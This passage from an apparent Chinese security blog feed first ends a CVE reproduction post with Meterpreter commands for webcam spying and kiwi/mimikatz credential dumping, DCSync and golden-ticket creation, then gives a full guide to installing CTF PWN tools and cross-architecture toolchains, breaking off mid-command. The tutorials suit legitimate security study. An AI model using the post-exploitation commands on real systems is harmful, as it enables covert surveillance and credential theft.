plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list# 查看有没有摄像头</span><br><span class="line">webcam_stream # 打开摄像头直播流</span><br><span class="line">webcam_snap # 拍照</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600353.png" alt="image-20220112154544582"></p><h3 id="获取密码">获取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600354.png" alt="image-20220112154640654"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600355.png" alt="image-20220112154731788"></p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建跨平台架构PWN环境</title>
      <link href="/posts/pwn-env/"/>
      <url>/posts/pwn-env/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>由于目前互联网上关于 CTF PWN 环境搭建的教程并不是什么详细完整，作者因此也阅读了多篇 PWN 的搭建的文章，并在各位师傅的文章上进行总结完善，加以亲自操作验证写下了这篇笔记。如有不足之处，劳烦师傅们前往博客评论区留言补充~</p><h2 id="系统安装">系统安装</h2><h3 id="Ubuntu">Ubuntu</h3><p>请参考博客中关于 Ubuntu 安装教程的文章~</p><h3 id="Kali-Linux">Kali Linux</h3><p>请参考博客中关于 Kali Linux 安装教程的文章~</p><h2 id="环境准备">环境准备</h2><h3 id="基础工具">基础工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y vim git gcc tree</span><br><span class="line">sudo apt install -y gdb gdb-multiarch</span><br><span class="line">sudo apt install -y <span class="string">&quot;binfmt*&quot;</span></span><br></pre></td></tr></table></figure><h3 id="安装-Python3">安装 Python3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y python3 python3-pip python3-dev</span><br></pre></td></tr></table></figure><h3 id="pip-换源">pip 换源</h3><p>此方法仅适用 Linux 下换源，其他系统请手动创建配置文件换源！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index-url http://pypi.doubanio.com/simple/</span><br><span class="line">pip config <span class="built_in">set</span> install.trusted-host pypi.doubanio.com</span><br></pre></td></tr></table></figure><h3 id="安装-Python2">安装 Python2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y python2 python2-dev</span><br><span class="line"><span class="comment"># pip官方已不在支持python2，无法安装python-pip，可以通过bootstrap的pip2脚本进行安装</span></span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py -O get-pip2.py</span><br><span class="line">python2 get-pip2.py</span><br><span class="line"><span class="built_in">rm</span> -rf get-pip2.py</span><br><span class="line">python2 -m pip install --upgrade pip==20.3.4</span><br></pre></td></tr></table></figure><h3 id="python-is-python3">python-is-python3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y python-is-python3</span><br></pre></td></tr></table></figure><h3 id="openssh-server">openssh-server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y openssh-server</span><br></pre></td></tr></table></figure><h2 id="pwntools">pwntools</h2><h3 id="Python3">Python3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><h3 id="Python2">Python2</h3><p>虽说 python2 用的不多了，但是还是建议安装一下，毕竟有时候可能还会用到~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python2 python2-dev git libssl-dev libffi-dev build-essential</span><br><span class="line"><span class="comment"># pip官方已不在支持python2，可以使用bootstrap的pip2脚本进行安装</span></span><br><span class="line">python2 -m pip install --upgrade pip==20.3.4</span><br><span class="line">python2 -m pip install --upgrade pwntools</span><br><span class="line">python2 -m pip install --upgrade pathlib2</span><br><span class="line">python2 -m pip install --upgrade setuptools <span class="comment"># Kali丢失，pwntools可能报错</span></span><br></pre></td></tr></table></figure><h3 id="验证-pwntools">验证 pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Ubuntu:~<span class="comment"># python2</span></span><br><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Mar  <span class="number">8</span> <span class="number">2021</span>, <span class="number">13</span>:02:<span class="number">45</span>)</span><br><span class="line">[GCC <span class="number">9.3</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pwn</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwn.asm(<span class="string">&quot;xor eax,eax&quot;</span>)</span><br><span class="line"><span class="string">&#x27;1\xc0&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Ubuntu:~<span class="comment"># python3</span></span><br><span class="line">Python <span class="number">3.8</span><span class="number">.10</span> (default, Sep <span class="number">28</span> <span class="number">2021</span>, <span class="number">16</span>:<span class="number">10</span>:<span class="number">42</span>)</span><br><span class="line">[GCC <span class="number">9.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&quot;xor eax,eax&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;1\xc0&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果返回结果如上，则 pwntools 已经安装好了</p><h2 id="GDB-插件">GDB 插件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /opt/pwnenv/tools</span><br><span class="line"><span class="built_in">cd</span> /opt/pwnenv/tools</span><br></pre></td></tr></table></figure><h3 id="pwndbg">pwndbg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh &amp;&amp; <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><h3 id="peda">peda</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><h3 id="gef">gef</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git</span><br></pre></td></tr></table></figure><h3 id="peda-heap">peda-heap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Mipu94/peda-heap.git</span><br></pre></td></tr></table></figure><h3 id="peda-arm">peda-arm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/alset0326/peda-arm.git</span><br></pre></td></tr></table></figure><h3 id="Pwngdb">Pwngdb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git</span><br></pre></td></tr></table></figure><h3 id="配置-gdbinit">配置 gdbinit</h3><p>先删除根目录下 pwndbg 生成的<code>~/.gdbinit</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf ~/.gdbinit</span><br></pre></td></tr></table></figure><p>然后再使用下面的命令重新配置，不要一行一行使用，一起复制粘贴到终端，追加写入文件~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; ~/.gdbinit &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">source /opt/pwnenv/tools/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">#source /opt/pwnenv/tools/peda/peda.py</span></span><br><span class="line"><span class="string">#source /opt/pwnenv/tools/gef/gef.py</span></span><br><span class="line"><span class="string">#source /opt/pwnenv/tools/peda-heap/peda.py</span></span><br><span class="line"><span class="string">#source /opt/pwnenv/tools/peda-arm/peda-arm.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Pwngdb config Start</span></span><br><span class="line"><span class="string">#source /opt/pwnenv/tools/Pwngdb/pwngdb.py</span></span><br><span class="line"><span class="string">#source /opt/pwnenv/tools/Pwngdb/angelheap/gdbinit.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">define hook-run</span></span><br><span class="line"><span class="string">python</span></span><br><span class="line"><span class="string">import angelheap</span></span><br><span class="line"><span class="string">angelheap.init_angelheap()</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string"># Pwngdb config END</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p>当前配置是在 root 权限下配置的，普通用户使用 gdb 没有插件，请在普通用户根目录下创建此配置文件~</p><h3 id="验证-gdb-插件">验证 gdb 插件</h3><p>修改 <code>~/.gdbinit</code> 文件，需要使用那个插件就取消哪个插件的注释~​</p><h2 id="ROPgadget">ROPgadget</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo -H python3 -m pip install capstone</span><br><span class="line">sudo -H python3 -m pip install ROPgadget</span><br><span class="line">ROPgadget --<span class="built_in">help</span></span><br><span class="line">ROPgadget -v</span><br></pre></td></tr></table></figure><h2 id="Ropper">Ropper</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">sudo pip install filebytes</span><br><span class="line">sudo pip install keystone-engine</span><br><span class="line">sudo pip install ropper</span><br></pre></td></tr></table></figure><h2 id="one-gadget">one_gadget</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y ruby ruby-dev</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="seccomp-tools">seccomp-tools</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y gcc ruby ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="LibcSearcher">LibcSearcher</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/pwnenv/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher/</span><br><span class="line">python setup.py develop</span><br><span class="line"><span class="comment"># 需要手动更新 libc-database</span></span><br><span class="line"><span class="built_in">rm</span> -rf libc-database/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database.git</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line">apt install zstd <span class="comment">#安装依赖</span></span><br><span class="line">./get ubuntu <span class="comment"># 一般的PWN题环境都是Ubuntu</span></span><br><span class="line"><span class="built_in">cd</span> ../..</span><br></pre></td></tr></table></figure><h2 id="glibc-all-in-one">glibc-all-in-one</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="built_in">cd</span> /opt/pwnenv/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">apt install python-is-python3</span><br><span class="line">./glibc-all-in-one/update_list</span><br><span class="line"><span class="built_in">cat</span> ./glibc-all-in-one/list &amp;&amp; <span class="built_in">cat</span> ./glibc-all-in-one/old_list</span><br></pre></td></tr></table></figure><h2 id="angr">angr</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install capstone angr</span><br></pre></td></tr></table></figure><h2 id="radare2">radare2</h2><p>Ubuntu 可以使用下面命令安装，Kali 自带</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install radare2</span><br><span class="line"></span><br><span class="line">r2pm update          <span class="comment"># initialize and update the package database</span></span><br><span class="line">r2pm install [pkg]   <span class="comment"># installs the package</span></span><br></pre></td></tr></table></figure><p>或者前往<a href="https://github.com/radareorg/radare2">Github</a>官方文档使用 git 安装</p><h2 id="patchelf">patchelf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure><h2 id="edb-debugger">edb-debugger</h2><p>Ubuntu 可以使用下面命令安装，Kali 自带</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install edb-debugger</span><br></pre></td></tr></table></figure><p>或者使用源码编译安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/</span><br><span class="line">sudo apt install cmake build-essential libboost-dev libqt5xmlpatterns5-dev qtbase5-dev qt5-default libqt5svg5-dev libgraphviz-dev libcapstone-dev</span><br><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/eteran/edb-debugger.git</span><br><span class="line"><span class="built_in">cd</span> edb-debugger &amp;&amp; <span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build</span><br><span class="line">cmake .. &amp;&amp; make</span><br><span class="line">./edb</span><br></pre></td></tr></table></figure><h2 id="ghidra">ghidra</h2><p>参照 <a href="https://github.com/NationalSecurityAgency/ghidra">GitHub</a>上的安装方法即可，Kali 已经安装~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/</span><br><span class="line">wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.0.4_build/ghidra_10.0.4_PUBLIC_20210928.zip</span><br><span class="line">unzip ghidra_10.0.4_PUBLIC_20210928.zip</span><br><span class="line"><span class="built_in">mv</span> ghidra_10.0.4_PUBLIC/ ghidra/</span><br><span class="line">sudo apt install default-jdk</span><br><span class="line">./ghidra/ghidraRun</span><br></pre></td></tr></table></figure><h2 id="安装-32-位库">安装 32 位库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y libc6-dev-i386</span><br><span class="line">sudo apt install -y lib32z1</span><br></pre></td></tr></table></figure><hr><h2 id="跨平台架构环境配置">跨平台架构环境配置</h2><h3 id="Qemu">Qemu</h3><h4 id="安装-qemu-user">安装 qemu-user</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y qemu qemu-user qemu-user-static</span><br></pre></td></tr></table></figure><h4 id="安装-qemu-system">安装 qemu-system</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y qemu qemu-user-static qemu-system uml-utilities bridge-utils</span><br><span class="line"><span class="comment"># sudo sudo apt install qemu-system-mips</span></span><br><span class="line"><span class="comment"># sudo sudo apt install -y libncurses5-dev synaptic</span></span><br></pre></td></tr></table></figure><p><strong>提示</strong>：如 aarch64 安装好的库在<code>/usr/aarch64-linux-gnu/lib/</code>目录下<code>qemu-aarch64</code>执行时通过<code>-L</code>指定<code>/usr/aarch64-linux-gnu</code>目录即可，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn</span><br></pre></td></tr></table></figure><blockquote><p>不想手动安装的可以看最后的命令合集~</p></blockquote><h3 id="Mips">Mips</h3><h4 id="mipsel-小端序-32-位">mipsel 小端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mipsel-linux-gnu g++-mipsel-linux-gnu libc6-mipsel-cross binutils-mipsel-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="mips-大端序-32-位">mips 大端序 32 位</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mips-linux-gnu g++-mips-linux-gnu libc6-mips-cross binutils-mips-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="mips64el-小端序-64-位">mips64el 小端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mips64el-linux-gnuabi64 g++-mips64el-linux-gnuabi64 libc6-mips64el-cross binutils-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure><h4 id="mips64-大端序-64-位">mips64 大端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mips64-linux-gnuabi64 g++-mips64-linux-gnuabi64 libc6-mips64-cross binutils-mips64-linux-gnuabi64</span><br></pre></td></tr></table></figure><h4 id="mipsisa32r6el-小端序-64-位">mipsisa32r6el 小端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mipsisa32r6el-linux-gnu g++-mipsisa32r6el-linux-gnu libc6-mipsr6el-cross binutils-mipsisa32r6el-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="mipsisa32r6-大端序-64-位">mipsisa32r6 大端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mipsisa32r6-linux-gnu g++-mipsisa32r6-linux-gnu libc6-mipsr6-cross libc6-mipsr6-cross binutils-mipsisa32r6-linux-gnu</span><br></pre></td></tr></table></figure><p>注：参考文章中关于 <code>libc6-dbg-mips*</code> 现已无法安装，本文将去除此包~</p><h4 id="mipsrop-插件">mipsrop 插件</h4><p>参照 GitHub 上的安装方法即可~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</span><br></pre></td></tr></table></figure><h3 id="Arm">Arm</h3><h4 id="armel-软浮点-小端序-32-位">armel 软浮点 小端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-arm-linux-gnueabi g++-arm-linux-gnueabi libc6-armel-cross libc6-dbg-armel-cross binutils-arm-linux-gnueabi</span><br></pre></td></tr></table></figure><h4 id="armhf-硬浮点-小端序-32-位">armhf 硬浮点 小端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf libc6-armhf-cross libc6-dbg-armhf-cross binutils-arm-linux-gnueabi</span><br></pre></td></tr></table></figure><h4 id="aarch64-小端序-64-位">aarch64 小端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-aarch64-linux-gnu g++-aarch64-linux-gnu libc6-arm64-cross libc6-dbg-arm64-cross binutils-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="hppa-PA-RISC">hppa(PA-RISC)</h3><h4 id="hppa-大端序-32-位">hppa 大端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-hppa-linux-gnu g++-hppa-linux-gnu libc6-hppa-cross libc6-dbg-hppa-cross binutils-hppa-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="hppa64-大端序-64-位">hppa64 大端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-hppa64-linux-gnu binutils-hppa64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="m68k">m68k</h3><h4 id="m68k-大端序-32-位">m68k 大端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-m68k-linux-gnu g++-m68k-linux-gnu libc6-m68k-cross libc6-dbg-m68k-cross binutils-m68k-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="ppc">ppc</h3><h4 id="powerpc-大端序-32-位">powerpc 大端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-powerpc-linux-gnu g++-powerpc-linux-gnu libc6-powerpc-cross libc6-dbg-powerpc-cross binutils-powerpc-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="powerpc64-大端序-64-位">powerpc64 大端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-powerpc64-linux-gnu g++-powerpc64-linux-gnu libc6-ppc64-cross libc6-dbg-ppc64-cross binutils-powerpc64-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="powerpc64le-小端序-64-位">powerpc64le 小端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-powerpc64le-linux-gnu g++-powerpc64le-linux-gnu libc6-ppc64el-cross libc6-dbg-ppc64el-cross binutils-powerpc64le-linux-gnu</span><br></pre></td></tr></table></figure><p>注：原博主的文章中 powerpcspe 信号处理引擎 大端序 32 位 现已无法安装，已经去除</p><h3 id="s390x">s390x</h3><h4 id="s390x-大端序-64-位">s390x 大端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-s390x-linux-gnu g++-s390x-linux-gnu libc6-s390x-cross libc6-dbg-s390x-cross binutils-s390x-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="sh4">sh4</h3><h4 id="sh4-小端序-32-位">sh4 小端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-sh4-linux-gnu g++-sh4-linux-gnu libc6-sh4-cross libc6-dbg-sh4-cross binutils-sh4-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="sparc64">sparc64</h3><h4 id="sparc64-大端序-64-位">sparc64 大端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-sparc64-linux-gnu g++-sparc64-linux-gnu libc6-dbg-sparc64-cross</span><br></pre></td></tr></table></figure><h3 id="alpha">alpha</h3><h4 id="alpha-小端序-64-位">alpha 小端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-alpha-linux-gnu g++-alpha-linux-gnu libc6.1-alpha-cross libc6.1-dbg-alpha-cross binutils-alpha-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="x86-64">x86_64</h3><h4 id="i686-小端序-32-位">i686 小端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-i686-linux-gnu g++-i686-linux-gnu libc6-i386-cross libc6-dbg-i386-cross binutils-i686-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="x86-64x32-小端序-32-位">x86_64x32 小端序 32 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt 